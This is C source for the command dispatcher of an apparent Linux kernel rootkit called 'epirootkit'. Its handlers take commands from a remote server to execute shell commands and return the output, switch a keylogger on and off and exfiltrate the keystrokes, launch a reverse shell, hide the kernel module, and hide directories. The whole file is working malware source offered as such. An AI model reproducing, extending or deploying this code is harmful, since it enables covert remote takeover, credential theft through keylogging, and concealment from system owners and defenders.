#include <linux/kernel.h>
#include <linux/net.h>
#include <linux/module.h>
#include <linux/socket.h>
#include <linux/inet.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include "epirootkit.h"

struct command {
	char *cmd_name;
	unsigned cmd_name_size;
	char *cmd_desc;
	unsigned cmd_desc_size;
	int (*cmd_handler)(char *args);
};

// Function prototypes
int rootkit_command(char *command, unsigned command_size);

// Handler prototypes
int exec_handler(char *args);
int klgon_handler(char *args);
int klgoff_handler(char *args);
int klg_handler(char *args);
int shellon_handler(char *args);
int killcom_handler(char *args);
int hide_module_handler(char *args);
int unhide_module_handler(char *args);
int hide_dir_handler(char *args);
int show_dir_handler(char *args);
int help_handler(char *args);
int rootkit_command(char *command, unsigned command_size);

static struct command rootkit_commands_array[] = {
	{ "exec", 4, "execute a shell command. Usage : exec [args*]", 20, exec_handler },
	{ "klgon", 6, "activate keylogger", 20, klgon_handler },
	{ "klgoff", 7, "deactivate keylogger", 21, klgoff_handler },
	{ "klg", 3, "send keylogger content to server", 35, klg_handler },
	{ "shellon", 7, "launch reverse shell", 20, shellon_handler },
	{ "killcom", 7, "exit the module", 16, killcom_handler },
	{ "hide_module", 11, "hide the module from the kernel", 34, hide_module_handler },
	{ "unhide_module", 13, "unhide the module in the kernel", 36, unhide_module_handler },
	{ "hide_dir", 8, "hide a directory from the kernel", 34, hide_dir_handler },
	{ "show_dir", 8, "unhide a directory from the kernel", 36, show_dir_handler },
	{ "help", 4, "display this help message", 30, help_handler },
	{ NULL, 0, NULL, 0, NULL }
};

int help_handler(char *args) {
	char *help_msg = kmalloc(STD_BUFFER_SIZE, GFP_KERNEL); 
	int offset = snprintf(help_msg, STD_BUFFER_SIZE, "Available commands:\n");
	for (int i = 0; rootkit_commands_array[i].cmd_name != NULL; i++) {
		offset += snprintf(help_msg + offset, STD_BUFFER_SIZE - offset, "\t -%s: %s\n", 
			rootkit_commands_array[i].cmd_name, rootkit_commands_array[i].cmd_desc);
		if (offset >= STD_BUFFER_SIZE) {
			ERR_MSG("help_handler: help message truncated\n");
			break;
		}
	}

	send_to_server(help_msg);

	kfree(help_msg);

	return 0;
}

int rootkit_command(char *command, unsigned command_size) {
	 // Remove newline character if present
	command[strcspn(command, "\n")] = '\0';

	if (command[command_size - 1] != '\0') {
		ERR_MSG("rootkit_command: command is not null-terminated\n");
		return -EINVAL;
	}

	int ret_code = -EINVAL;
	for (int i = 0; rootkit_commands_array[i].cmd_name != NULL; i++) {
		if (strncmp(command, rootkit_commands_array[i].cmd_name, rootkit_commands_array[i].cmd_name_size - 1) == 0) {
			char *args = command + rootkit_commands_array[i].cmd_name_size;
			ret_code = rootkit_commands_array[i].cmd_handler(args);
			return ret_code;
		}
	}
	
	ERR_MSG("rootkit_command: unknown command \"%s\"\n", command);
	send_to_server("unknown command\n");

	return ret_code;
}

int exec_handler(char *args) {
	// Extract the command from the received message
	char *command = args;
	command[strcspn(command, "\n")] = '\0';
	DBG_MSG("exec_handler: executing command: %s\n", command);

	// Execute the command
	int ret_code = exec_str_as_command(command);
	if (ret_code < 0) {
		ERR_MSG("exec_handler: failed to execute command\n");
		return ret_code;
	}

	// Send the result back to the server
	char result_msg[2 * STD_BUFFER_SIZE];
	snprintf(result_msg, 
				sizeof(result_msg), 
				"execution result:\nstdout:\n%s\nstderr:\n%s\nterminated with code %d\n", 
				exec_result.std_out, exec_result.std_err, exec_result.code);
	ret_code = send_to_server(result_msg);
	if (ret_code != SUCCESS) {
		ERR_MSG("exec_handler: failed to send result message\n");
	}
	DBG_MSG("exec_handler: command result sent\n");
	return ret_code;
}

int klgon_handler(char *args) {
	int ret_code = epikeylog_init(0);
	if (ret_code < 0) {
		ERR_MSG("klgon_handler: failed to activate keylogger\n");
		return ret_code;
	}
	send_to_server("keylogger activated\n");
	DBG_MSG("klgon_handler: keylogger activated\n");
	return ret_code;
}

int klgoff_handler(char *args) {
	int ret_code = epikeylog_exit();
	if (ret_code < 0) {
		ERR_MSG("klgoff_handler: failed to deactivate keylogger\n");
		return ret_code;
	}
	send_to_server("keylogger deactivated\n");
	DBG_MSG("klgoff_handler: keylogger deactivated\n");
	return ret_code;
}

int klg_handler(char *args) {
	int ret_code = epikeylog_send_to_server();
	if (ret_code < 0) {
		ERR_MSG("klg_handler: failed to send keylogger content\n");
		return ret_code;
	}
	DBG_MSG("klg_handler: keylogger content sent\n");
	return ret_code;
}

int shellon_handler(char *args) {
	DBG_MSG("shellon_handler: shellon received, launching reverse shell\n");
	int ret_code = launch_reverse_shell();
	if (ret_code < 0) {
		ERR_MSG("shellon_handler: failed to launch reverse shell\n");
	}
	return ret_code;
}

int killcom_handler(char *args) {
	DBG_MSG("killcom_handler: killcom received, exiting...\n");
	thread_exited = true;
	return 0;
}

int hide_module_handler(char *args) {
	DBG_MSG("hide_module_handler: hiding module\n");
	int ret_code = hide_module();
	if (ret_code < 0) {
		ERR_MSG("hide_module_handler: failed to hide module\n");
	}
	return ret_code;
}

int unhide_module_handler(char *args) {
	DBG_MSG("unhide_module_handler: unhiding module\n");
	int ret_code = unhide_module();
	if (ret_code < 0) {
		ERR_MSG("unhide_module_handler: failed to unhide module\n");
	}
	return ret_code;
}

int hide_dir_handler(char *args) {
	char *dir = args;
	dir[strcspn(dir, "\n")] = '\0';
	int ret_code = add_hidden_dir(dir);
	if (ret_code < 0) {
		ERR_MSG("hide_dir_handler: failed to hide directory\n");
	} else {
		DBG_MSG("hide_dir_handler: directory %s hidden\n", dir);
	}
	return ret_code;
}

int show_dir_handler(char *args) {
	char *dir = args;
	dir[strcspn(dir, "\n")] = '\0';
	int ret_code = remove_hidden_dir(dir);
	if (ret_code < 0) {
		ERR_MSG("show_dir_handler: failed to unhide directory\n");
	} else {
		DBG_MSG("show_dir_handler: directory %s unhidden\n", dir);
	}
	return ret_code;
}